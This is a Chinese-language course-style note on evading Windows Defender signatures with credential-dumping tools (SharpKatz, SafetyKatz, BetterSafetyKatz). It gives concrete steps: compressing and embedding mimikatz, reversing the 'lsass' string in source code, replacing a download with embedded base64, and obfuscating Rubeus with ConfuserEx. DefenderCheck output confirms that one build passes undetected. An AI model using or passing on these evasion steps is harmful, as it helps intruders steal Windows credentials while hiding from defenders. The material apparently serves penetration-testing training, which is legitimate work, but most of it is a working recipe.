# AV bypass

主要思路是通过混淆（Obfuscation）和字符串操纵（String Manipulation）等技术绕过基于签名的检测

使用检查工具是：[DefenderCheck](https://github.com/t3hbb/DefenderCheck)

# 字符串操纵（String Manipulation）

## 例子1：SharpKatz.exe

使用DefenderCheck检查SharpKatz.exe

```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\SharpKatz-master\SharpKatz\bin\Debug\SharpKatz.exe

OriginalFileDetectionStatus is : ThreatFound
Target file size: 235520 bytes
Analyzing...

File matched signature: "VirTool:MSIL/SharpKatz.A"

[!] Identified end of bad bytes at offset 0x1198B in the original file
File matched signature: "HackTool:Win64/Mimikatz.D"

00000000   06 70 00 28 00 08 00 00  48 00 00 00 00 0D 00 08   ·p·(····H·······
00000010   00 32 00 00 00 00 00 00  00 40 00 0A 01 00 00 00   ·2·······@······
00000020   00 00 00 00 00 00 48 00  00 00 00 0E 00 08 00 32   ······H········2
00000030   00 00 00 00 00 00 00 40  00 0A 01 00 00 00 00 00   ·······@········
00000040   00 00 00 00 48 00 00 00  00 0F 00 08 00 32 00 00   ····H········2··
00000050   00 00 00 00 00 40 00 0A  01 00 00 00 00 00 00 00   ·····@··········
00000060   00 00 48 00 00 00 00 10  00 30 00 30 40 00 00 00   ··H······0·0@···
00000070   00 2C 00 24 00 47 06 0A  07 01 00 01 00 00 00 00   ·,·$·G··········
00000080   00 08 00 00 00 B8 03 48  00 08 00 08 00 0B 01 10   ·····?·H········
00000090   00 48 06 50 21 18 00 08  00 13 41 20 00 72 06 70   ·H·P!·····A ·r·p
000000A0   00 28 00 08 00 00 48 00  00 00 00 11 00 30 00 30   ·(····H······0·0
000000B0   40 00 00 00 00 2C 00 24  00 47 06 0A 07 01 00 01   @····,·$·G······
000000C0   00 00 00 00 00 08 00 00  00 B8 03 48 00 08 00 08   ·········?·H····
000000D0   00 0B 01 10 00 8C 06 50  21 18 00 08 00 13 A1 20   ·····?·P!·····?
000000E0   00 C6 06 70 00 28 00 08  00 00 49 89 CA B8 3F 00   ·?·p·(····I?ê??·
000000F0   00 00 0F 05 C3 74 25 8B  24 43 72 64 41 FF 15 49   ····?t%?$CrdA?·I
```

教材里的方法是把整个项目的```Credentials```替换成```Credents```,然后生成exe再检查

然而操作了上面的步骤以后依然过不了wd，不知道是不是因为wd的签名更新了


## 例子2：SafetyKatz 

1. 下载最新版本的[Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)和mimikatz

2. 使用Out-CompressedDll.ps1操作mimikatz，导出结果到outputfilename.txt
```
PS D:\BaiduNetdiskDownload\CRTE\Tools> . .\Out-CompressedDll.ps1
PS D:\BaiduNetdiskDownload\CRTE\Tools> Out-CompressedDll D:\BaiduNetdiskDownload\CRTE\Tools\mimikatz_trunk\x64\mimikatz.exe > outputfilename.txt
PS D:\BaiduNetdiskDownload\CRTE\Tools>
```

3. 打开outputfilename.txt

4. 替换constants.cs
把```$EncodedCompressedFile```这个变量的内容

```
$EncodedCompressedFile = @'3H15fF.....s/wA='
```

复制到SafetyKatz项目的```constants.cs```这个文件里的```compressedMimikatzString```变量
```
namespace SafetyKatz
{
    public static class Constants
    {
        // compressed mimikatz.exe output from Out-CompressedDLL
        public static string compressedMimikatzString = "3H15fF.....s/wA=";
    }
}

```

5. 替换Program.cs

把outputfilename.txt下面这行代码的数字
```
$DeflatedStream.Read($UncompressedFileBytes, 0, 1234696) | Out-Null
```
替换到Program.cs的 111 和 116行

```
                Byte[] unpacked = new byte[1234696];
                ...
                ...
                stream.Read(unpacked, 0, 1234696);
```

6. 保存。生成exe。使用DefenderCheck检查

```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\SafetyKatz-master\SafetyKatz\bin\Debug\SafetyKatz.exe

OriginalFileDetectionStatus is : ThreatFound
Target file size: 1569280 bytes
Analyzing...

File matched signature: "VirTool:MSIL/DumpLsass.A"

[!] Identified end of bad bytes at offset 0x17E009 in the original file
File matched signature: "VirTool:MSIL/DumpLsass.A"

00000000   76 00 30 00 52 00 70 00  65 00 4C 00 6D 00 69 00   v·0·R·p·e·L·m·i·
00000010   62 00 37 00 62 00 68 00  74 00 65 00 31 00 53 00   b·7·b·h·t·e·1·S·
00000020   56 00 6C 00 64 00 76 00  6A 00 45 00 43 00 35 00   V·l·d·v·j·E·C·5·
00000030   31 00 66 00 48 00 6D 00  6B 00 38 00 50 00 4B 00   1·f·H·m·k·8·P·K·
00000040   69 00 30 00 67 00 32 00  66 00 75 00 6B 00 63 00   i·0·g·2·f·u·k·c·
00000050   6E 00 54 00 67 00 71 00  38 00 6C 00 46 00 74 00   n·T·g·q·8·l·F·t·
00000060   72 00 4D 00 75 00 39 00  37 00 54 00 50 00 75 00   r·M·u·9·7·T·P·u·
00000070   58 00 64 00 59 00 6A 00  76 00 66 00 30 00 69 00   X·d·Y·j·v·f·0·i·
00000080   4B 00 50 00 4A 00 6F 00  61 00 49 00 41 00 79 00   K·P·J·o·a·I·A·y·
00000090   4F 00 38 00 67 00 74 00  36 00 57 00 50 00 52 00   O·8·g·t·6·W·P·R·
000000A0   41 00 71 00 30 00 30 00  5A 00 4D 00 50 00 64 00   A·q·0·0·Z·M·P·d·
000000B0   32 00 73 00 5A 00 57 00  51 00 73 00 37 00 32 00   2·s·Z·W·Q·s·7·2·
000000C0   78 00 77 00 6E 00 77 00  54 00 57 00 77 00 4D 00   x·w·n·w·T·W·w·M·
000000D0   56 00 68 00 32 00 73 00  30 00 79 00 48 00 32 00   V·h·2·s·0·y·H·2·
000000E0   56 00 69 00 7A 00 45 00  37 00 73 00 2F 00 77 00   V·i·z·E·7·s·/·w·
000000F0   41 00 3D 00 00 0B 6C 00  73 00 61 00 73 00 73 00   A·=···l·s·a·s·s·
```

看起来是有一个lsass的字符串触发了签名

7. 修改Program.cs里的
```
 Process[] processes = Process.GetProcessesByName("lsass");
```

为：
```
string str = "ssasl";
 
string reverse = str.Reverse();
Process[] processes = Process.GetProcessesByName(reverse);
```

注意还需要在当前类外面添加代码
```
 public static class Extensions
    {
        public static string Reverse(this string str)
        {
            char[] chars = str.ToCharArray();
            Array.Reverse(chars);
            return new string(chars);
        }
    }
```

保存。重新生成exe

8. 再次检查,已经可以绕过wd
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\SafetyKatz-master\SafetyKatz\bin\Debug\SafetyKatz.exe

OriginalFileDetectionStatus is : NoThreatFound
[+] No threat found in submitted file!

```

## 例子3，BetterSafetyKatz

教材上的方法是：
1. 把mimikatz的zip转化成base64
```
PS E:\BaiduNetdiskDownload\CRTE\Tools> $filename = "E:\BaiduNetdiskDownload\CRTE\Tools\mimikatz_trunk.zip"
PS E:\BaiduNetdiskDownload\CRTE\Tools> [Convert]::ToBase64String([io.file]::ReadAllBytes($filename)) > o.txt
```

2. 在program.cs加一个变量

```
string base64value = "<上面mimikatz的base64>"
```

3. 注释program.cs这一段

```
  //Is it a URI?
                // if (latestPath.StartsWith("http"))
                // {
                //     //Download
                //     zipStream = webClient.DownloadData(latestPath);
                // }
                // else
                // {
                //     //Read file from path
                //     zipStream = File.ReadAllBytes(latestPath);
                // }
```

底下再加一行
```
zipStream = Convert.FromBase64String(base64value);
```

重新生成

但是单凭上面几步不能过现在的wd

## 使用[ConfuserEx](https://github.com/mkaring/ConfuserEx)混淆Rubeus.exe